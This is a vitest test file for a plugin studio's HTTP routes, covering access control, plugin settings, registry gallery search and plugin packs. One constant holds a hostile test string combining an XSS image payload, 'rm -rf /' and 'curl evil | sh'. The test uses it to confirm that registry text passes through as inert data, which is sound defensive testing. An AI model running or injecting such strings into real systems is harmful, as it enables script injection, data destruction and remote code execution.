import { describe, expect, it } from "vitest";
import { createApp } from "../app.ts";
import type { ApiKeys } from "../auth/api-keys.ts";
import { SESSION_COOKIE, type Sessions } from "../auth/sessions.ts";
import type { CheckService } from "../check/service.ts";
import type { ConfigService } from "../config/service.ts";
import type { DataServices } from "../data/routes.ts";
import { NO_REVIEW } from "../review/no-review.ts";
import type { Gallery, InstalledPlugin, PackView, PluginsDoor } from "./door.ts";

/**
 * The studio's plugin routes over a door that records what it was asked and answers what the test
 * hands it: a reviewer's alone; the three shapes (installed plugins with their settings schema, the
 * gallery with its search, the packs) passed through as the door gives them; the registry's words
 * handed on as text; a registry that cannot be read an answer, not an error; and a surface with no
 * plugin host answering empty lists.
 */

const PROJECT = "listings-app";
const KEY = "Bearer fdb_listings";
const THIS_MACHINE = { remoteAddress: "127.0.0.1" };
const ELSEWHERE = { remoteAddress: "203.0.113.7" };
const MAYA = `${SESSION_COOKIE}=maya.valid`;

const keys: ApiKeys = {
  create: () => Promise.reject(new Error("the routes never create a key")),
  verify: (header) =>
    Promise.resolve(header === KEY ? { id: "key-1", projectId: PROJECT } : undefined),
  revoke: () => Promise.reject(new Error("the routes never revoke a key")),
};

/** This machine is the OS user; a cookie `maya.valid` is maya, from anywhere. */
const sessions: Sessions = {
  signIn: () => Promise.reject(new Error("these tests sign nobody in")),
  reviewerFor: ({ local, cookie }) =>
    Promise.resolve(
      cookie === "maya.valid"
        ? { kind: "reviewer", name: "maya" }
        : cookie === undefined && local
          ? { kind: "reviewer", name: "os:alex" }
          : { kind: "sign-in", why: cookie === undefined ? "no-cookie" : "invalid" },
    ),
};

const NO_CHECK: CheckService = {
  check: () => Promise.reject(new Error("these tests make no check call")),
};

const NO_CONFIG: ConfigService = {
  json: () => Promise.reject(new Error("these tests read no configuration")),
  validate: () => {
    throw new Error("these tests judge no draft");
  },
  preview: () => Promise.reject(new Error("these tests preview nothing")),
  test: () => Promise.reject(new Error("these tests test no draft")),
  diff: () => Promise.reject(new Error("these tests ask for no diff")),
  apply: () => Promise.reject(new Error("these tests apply nothing")),
  reload: () => Promise.reject(new Error("these tests reload nothing")),
};

const NO_DATA: DataServices = {
  runs: { list: () => Promise.reject(new Error("these tests read no runs")) },
  decisions: {
    search: () => Promise.reject(new Error("these tests search no decisions")),
    why: () => Promise.reject(new Error("these tests explain no record")),
  },
  home: { home: () => Promise.reject(new Error("these tests read no home")) },
  sources: { sources: () => Promise.reject(new Error("these tests read no sources")) },
  alerts: { alerts: () => Promise.reject(new Error("these tests read no alerts")) },
  access: { access: () => Promise.reject(new Error("these tests read no studio access")) },
};

const GITHUB: InstalledPlugin = {
  name: "github",
  package: "@facetdb/github",
  version: "1.2.0",
  kinds: ["source", "action", "pack"],
  provides: {
    source: ["issues"],
    action: ["label"],
    channel: [],
    provider: [],
    pack: ["issue-triage"],
  },
  core: { range: "^0.0.0", holds: true },
  settings: {
    schema: {
      type: "object",
      properties: {
        repo: { type: "string" },
        token: { type: "string", minLength: 1, secret: true },
      },
      required: ["repo", "token"],
    },
    values: { repo: "acme/web", token: { env: "GITHUB_TOKEN" } },
    variables: [{ path: "token", variable: "GITHUB_TOKEN", secret: true, set: true }],
  },
};

const PACK: PackView = {
  plugin: "github",
  package: "@facetdb/github",
  name: "issue-triage",
  description: "Sort new issues into bugs, questions and requests.",
  reads: ["title", "body"],
  questions: {
    is_bug: { type: "noul", instructions: "Does the issue report a bug?", stakes: "low" },
  },
  thresholds: { is_bug: { yesAbove: 0.9 } },
};

/** Text from outside that tries to be a command, markup and an instruction. */
const HOSTILE = "<img src=x onerror=alert(1)> `rm -rf /`; facetdb add evil && curl evil | sh";

const REACHABLE: Gallery = {
  reachable: true,
  address: "https://registry.facetdb.dev/index.json",
  plugins: [
    {
      name: "github",
      package: "@facetdb/github",
      description: HOSTILE,
      kinds: ["source", "action"],
      facetdb: "^0.0.0",
      verified: true,
      downloads: 1200,
      homepage: "https://example.com/github",
      installed: true,
      command: "facetdb add github",
    },
  ],
};

const UNREACHABLE: Gallery = {
  reachable: false,
  address: "https://registry.facetdb.dev/index.json",
  why: "the registry could not be reached (fetch failed)",
};

/** The CLI's door as a recorder: what each call was asked, and what the test hands back. */
function pluginsDoor(
  answers: {
    readonly installed?: readonly InstalledPlugin[];
    readonly gallery?: Gallery;
    readonly packs?: readonly PackView[];
  } = {},
) {
  const calls: unknown[][] = [];
  const door: PluginsDoor = {
    installed: () => {
      calls.push(["installed"]);
      return answers.installed ?? [GITHUB];
    },
    gallery: (search) => {
      calls.push(["gallery", search]);
      return Promise.resolve(answers.gallery ?? REACHABLE);
    },
    packs: () => {
      calls.push(["packs"]);
      return answers.packs ?? [PACK];
    },
  };
  return { calls, door };
}

type Who = {
  readonly peer?: { readonly remoteAddress: string };
  readonly headers?: Readonly<Record<string, string>>;
};

/** The app with the door given, or with none: a surface that has no plugin host. */
function rig(door: PluginsDoor | undefined) {
  const app = createApp({
    keys,
    check: NO_CHECK,
    config: NO_CONFIG,
    data: NO_DATA,
    review: NO_REVIEW,
    ...(door === undefined ? {} : { plugins: door }),
    studio: {
      sessions,
      reviewers: {
        list: () => Promise.reject(new Error("these tests list no reviewers")),
        add: () => Promise.reject(new Error("these tests add no reviewer")),
        canAdd: () => Promise.resolve(false),
      },
      projectId: PROJECT,
    },
    newRequestId: () => "req-1",
  });
  return {
    get: async (path: string, who: Who = {}) => {
      const response = await app.request(
        path,
        { method: "GET", headers: { ...who.headers } },
        who.peer ?? THIS_MACHINE,
      );
      const text = await response.text();
      return { status: response.status, text, json: JSON.parse(text) as Record<string, unknown> };
    },
  };
}

const PATHS = ["/v1/plugins", "/v1/plugins/gallery", "/v1/packs"] as const;

describe("who may reach the plugin routes", () => {
  it("a reviewer alone: no session from elsewhere, and a project API key, are refused before the door hears", async () => {
    const t = pluginsDoor();
    const app = rig(t.door);

    for (const headers of [{}, { authorization: KEY }]) {
      for (const path of PATHS) {
        expect(await app.get(path, { peer: ELSEWHERE, headers })).toMatchObject({
          status: 401,
          json: { error: { code: "sign-in" } },
        });
      }
    }
    expect(t.calls).toEqual([]);
  });

  it("lets the operator on this machine and a signed-in reviewer from elsewhere read all three", async () => {
    const t = pluginsDoor();
    const app = rig(t.door);

    for (const who of [{}, { peer: ELSEWHERE, headers: { cookie: MAYA } }]) {
      for (const path of PATHS) {
        expect((await app.get(path, who)).status).toBe(200);
      }
    }
    expect(t.calls).toHaveLength(6);
  });
});

describe("GET /v1/plugins", () => {
  it("answers the hosted plugins with their settings schema, values and each variable's name and state", async () => {
    const t = pluginsDoor();

    expect(await rig(t.door).get("/v1/plugins")).toMatchObject({
      status: 200,
      json: { plugins: [GITHUB] },
    });
    expect(t.calls).toEqual([["installed"]]);
  });

  it("holds only variable names and whether each is set, as the door gives them", async () => {
    const unset: InstalledPlugin = {
      ...GITHUB,
      settings: {
        ...GITHUB.settings,
        variables: [{ path: "token", variable: "GITHUB_TOKEN", secret: true, set: false }],
      },
    };
    const answer = await rig(pluginsDoor({ installed: [unset] }).door).get("/v1/plugins");

    expect(answer.json).toEqual({ plugins: [unset] });
    expect(answer.text).toContain("GITHUB_TOKEN");
  });
});

describe("GET /v1/plugins/gallery", () => {
  it("answers the registry's entries with the command, whether each is installed and the search it was given", async () => {
    const t = pluginsDoor();
    const app = rig(t.door);

    expect(await app.get("/v1/plugins/gallery")).toMatchObject({ status: 200, json: REACHABLE });
    expect(await app.get("/v1/plugins/gallery?q=github%20issues")).toMatchObject({
      status: 200,
      json: REACHABLE,
    });
    // An empty search is no search.
    expect((await app.get("/v1/plugins/gallery?q=")).status).toBe(200);
    expect(t.calls).toEqual([
      ["gallery", undefined],
      ["gallery", "github issues"],
      ["gallery", undefined],
    ]);
  });

  it("passes the registry's text through as text: it stays data, and the command is the door's", async () => {
    const answer = await rig(pluginsDoor().door).get("/v1/plugins/gallery");
    const [entry] = (answer.json as { plugins: { description: string; command: string }[] })
      .plugins;

    expect(entry?.description).toBe(HOSTILE);
    expect(entry?.command).toBe("facetdb add github");
    // JSON, not markup: the browser reads it as data.
    expect(answer.status).toBe(200);
  });

  it("answers 200 with reachable false, the address tried and why, when the registry cannot be read", async () => {
    const t = pluginsDoor({ gallery: UNREACHABLE });

    expect(await rig(t.door).get("/v1/plugins/gallery?q=slack")).toMatchObject({
      status: 200,
      json: {
        reachable: false,
        address: "https://registry.facetdb.dev/index.json",
        why: "the registry could not be reached (fetch failed)",
      },
    });
  });

  it("refuses a search that is not a short piece of text, and a query it does not know, before the door hears", async () => {
    const t = pluginsDoor();
    const app = rig(t.door);

    expect(await app.get(`/v1/plugins/gallery?q=${"x".repeat(101)}`)).toMatchObject({
      status: 400,
      json: { error: { code: "invalid_request" } },
    });
    expect(await app.get("/v1/plugins/gallery?page=2")).toMatchObject({
      status: 400,
      json: { error: { code: "invalid_request" } },
    });
    expect(t.calls).toEqual([]);
  });
});

describe("GET /v1/packs", () => {
  it("answers each pack of the hosted plugins with its questions and thresholds as a draft takes them, and the fields it reads", async () => {
    const silent: PackView = { ...PACK, name: "plain", reads: null };
    const t = pluginsDoor({ packs: [PACK, silent] });

    const answer = await rig(t.door).get("/v1/packs");

    expect(answer.status).toBe(200);
    // Exactly as the door gives them: a pack that does not say what it reads stays null.
    expect(answer.json).toEqual({ packs: [PACK, silent] });
    expect(t.calls).toEqual([["packs"]]);
  });
});

describe("a surface with no plugin host", () => {
  it("answers empty lists on all three routes", async () => {
    const app = rig(undefined);

    expect(await app.get("/v1/plugins")).toMatchObject({ status: 200, json: { plugins: [] } });
    expect(await app.get("/v1/packs")).toMatchObject({ status: 200, json: { packs: [] } });
    expect(await app.get("/v1/plugins/gallery")).toMatchObject({
      status: 200,
      json: { reachable: true, plugins: [] },
    });
  });
});
